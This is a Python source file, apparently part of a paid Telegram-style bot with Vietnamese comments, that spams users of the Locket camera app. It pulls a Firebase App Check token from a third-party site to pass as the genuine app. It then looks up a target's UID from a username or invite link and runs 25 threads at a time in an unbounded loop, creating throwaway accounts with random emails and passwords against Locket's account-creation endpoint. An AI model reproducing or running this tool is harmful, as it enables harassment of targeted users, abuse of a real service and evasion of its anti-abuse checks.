# spammer.py

import requests
import re
import random
import string
import threading
import time
from typing import Optional, Callable
from urllib.parse import urlparse, parse_qs, urlencode

from keygen import validate_key as validate_license_from_file

class SpamManager:
    def __init__(self):
        # Các hằng số API
        self.TOKEN_API_URL = "https://thanhdieu.com/api/v1/locket/token"
        self.API_LOCKET_URL = "https://api.locketcamera.com"
        self.SHORT_URL_API = "https://url.thanhdieu.com/api/v1" # API để giải mã link
        self.REQUEST_TIMEOUT = 15

        # Lấy token cần thiết khi khởi tạo
        self.FIREBASE_APP_CHECK_TOKEN = self._fetch_app_check_token()
        if not self.FIREBASE_APP_CHECK_TOKEN:
            print("CRITICAL: Không thể lấy App Check Token từ API, chức năng spam sẽ thất bại.")

        self.active_spam_sessions = {}
        # Lưu trữ các thông báo lỗi để debug
        self.last_error_message = ""

    def _fetch_app_check_token(self):
        #... Giữ nguyên ...
        try:
            res = requests.get(self.TOKEN_API_URL, timeout=self.REQUEST_TIMEOUT)
            if res.status_code == 200:
                token = res.json().get("data", {}).get("token")
                if token: return token
            return None
        except requests.RequestException: return None

    def validate_license(self, key: str) -> dict:
        return validate_license_from_file(key)

    # =========================================================================
    # HÀM TÌM UID ĐƯỢC PHỤC HỒI VÀ NÂNG CẤP
    # =========================================================================
    def _get_redirected_url(self, url: str) -> Optional[str]:
        """Lấy URL cuối cùng sau khi theo tất cả các chuyển hướng (redirect)."""
        try:
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"}
            response = requests.get(url, headers=headers, allow_redirects=True, timeout=self.REQUEST_TIMEOUT)
            return response.url
        except requests.RequestException as e:
            self.last_error_message = f"Lỗi kết nối khi lấy URL cuối: {e}"
            return None
    
    def _extract_uid_from_final_url(self, final_url: str) -> Optional[str]:
        """Trích xuất UID từ một URL Locket camera đầy đủ."""
        if not final_url:
            self.last_error_message = "URL cuối cùng rỗng."
            return None
        
        match = re.search(r'locket\.camera/invites/([a-zA-Z0-9]{28})', final_url)
        if match:
            return match.group(1)
        else:
            self.last_error_message = f"Không tìm thấy UID trong URL cuối cùng: {final_url}"
            return None

    def find_locket_uid(self, user_input: str) -> Optional[str]:
        """
        Hàm tổng hợp để tìm Locket UID từ bất kỳ đầu vào nào (username, link ngắn, link dài).
        Đây là phiên bản mạnh mẽ hơn.
        """
        user_input = user_input.strip()
        # Nếu là username (không phải link), tạo link chuẩn
        if not re.match(r'^https?://', user_input):
            url_to_check = f"https://locket.cam/{user_input}"
        else:
            url_to_check = user_input
        
        self.last_error_message = "" # Reset thông báo lỗi

        # Lấy URL cuối cùng sau khi chuyển hướng
        final_url = self._get_redirected_url(url_to_check)

        # Nếu có URL cuối, trích xuất UID từ đó
        if final_url:
            return self._extract_uid_from_final_url(final_url)

        # Nếu không có URL cuối (có thể do lỗi), không làm gì thêm
        return None

    # =========================================================================
    # CÁC HÀM SPAM KHÁC GIỮ NGUYÊN
    # =========================================================================

    def _run_single_spam_thread(self, target_uid, stop_event, stats):
        if not self.FIREBASE_APP_CHECK_TOKEN: stats['failed'] += 1; return
        try:
            headers = {'Content-Type': 'application/json', 'X-Firebase-AppCheck': self.FIREBASE_APP_CHECK_TOKEN}
            email = f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=15))}@thanhdieu.com"
            password = 'zlocket' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=7))
            create_payload = {"data": {"email": email, "password": password, "client_email_verif": True, "platform": "ios"}}
            create_res = requests.post(f"{self.API_LOCKET_URL}/createAccountWithEmailPassword", headers=headers, json=create_payload, timeout=self.REQUEST_TIMEOUT)
            if stop_event.is_set(): return
            if create_res.status_code == 200: stats['success'] += 1
            else: stats['failed'] += 1
        except requests.RequestException:
            if not stop_event.is_set(): stats['failed'] += 1

    def start_spam_session(self, user_id: int, target: str, update_callback: Callable):
        # Thay đổi ở đây: gọi hàm find_locket_uid mới
        target_uid = self.find_locket_uid(target)
        
        if not target_uid:
            # Gửi thông báo lỗi chi tiết hơn
            error_msg = f"Không thể tìm thấy Locket UID từ `{target}`."
            if self.last_error_message:
                error_msg += f"\nLý do có thể: `{self.last_error_message}`"
            update_callback(status="error", message=error_msg)
            return

        if user_id in self.active_spam_sessions: update_callback(status="error", message="Bạn đã có một phiên spam đang chạy."); return
        
        stop_event = threading.Event(); self.active_spam_sessions[user_id] = stop_event
        stats = {'success': 0, 'failed': 0, 'start_time': time.time()}
        
        def spam_loop():
            # ... Logic vòng lặp spam giữ nguyên ...
            last_update_time = time.time()
            while not stop_event.is_set():
                threads = [threading.Thread(target=self._run_single_spam_thread, args=(target_uid, stop_event, stats)) for _ in range(25)]
                for t in threads: t.start()
                for t in threads: t.join()
                if time.time() - last_update_time > 5: 
                    update_callback(status="running", stats=stats)
                    last_update_time = time.time()
            update_callback(status="stopped", stats=stats)
            if user_id in self.active_spam_sessions: del self.active_spam_sessions[user_id]
        
        session_thread = threading.Thread(target=spam_loop); session_thread.daemon = True; session_thread.start()
        update_callback(status="started", message=f"✅ Đã bắt đầu phiên spam tới target UID: `{target_uid}`.")
    
    def stop_spam_session(self, user_id: int) -> bool:
        if user_id in self.active_spam_sessions: self.active_spam_sessions[user_id].set(); return True
        return False
